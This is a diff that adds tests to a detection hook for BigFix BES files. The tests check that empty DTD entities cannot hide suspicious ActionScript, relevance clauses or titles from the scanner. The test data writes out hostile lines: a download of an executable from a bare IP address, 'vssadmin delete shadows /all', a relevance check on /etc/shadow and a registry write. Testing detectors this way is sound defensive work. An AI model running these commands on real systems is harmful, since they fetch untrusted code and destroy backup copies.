@@ -816,6 +816,41 @@ def test_main_rejects_an_unknown_disable_code(tmp_path):
         hook.main(["--disable", "W92l", str(path)])
 
 
+def _with_empty_entity(doc):
+    """`doc` with a DTD declaring &e; as nothing."""
+    return doc.replace("<BES ", '<!DOCTYPE BES [<!ENTITY e "">]>\n<BES ', 1)
+
+
+def test_entity_does_not_hide_the_actionscript_after_it():
+    # unexpanded, &e; is a child node and `.text` stops before it
+    script = (
+        "download now http://1.2.3.4/x.exe\nwaithidden vssadmin delete shadows /all"
+    )
+    doc = _with_empty_entity(bes(actionscript=script)).replace(
+        "<ActionScript><![CDATA[", "<ActionScript>&e;<![CDATA[", 1
+    )
+    found = codes(doc)
+    assert {"W910", "W912", "W931"} <= set(found)
+
+
+def test_entity_does_not_hide_relevance_or_a_check_title():
+    doc = _with_empty_entity(
+        bes(
+            title="&e;Check Something",
+            actionscript='regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\X]" "a"=dword:1',
+            extra='<Relevance>&e;exists file "/etc/shadow"</Relevance>\n',
+        )
+    )
+    found = codes(doc)
+    assert "W950" in found and "W991" in found
+
+
+def test_w929_scores_a_dtd_once_however_many_entities():
+    entities = "".join(f'<!ENTITY e{n} "x">\n' for n in range(5))
+    doc = bes().replace("<BES ", f"<!DOCTYPE BES [\n{entities}]>\n<BES ", 1)
+    assert codes(doc).count("W929") == 1
+
+
 def test_dtd_entity_is_not_expanded_but_its_text_is_scanned():
     doc = bes(
         extra="<MIMEField><Name>x</Name><Value>&s;</Value></MIMEField>\n"
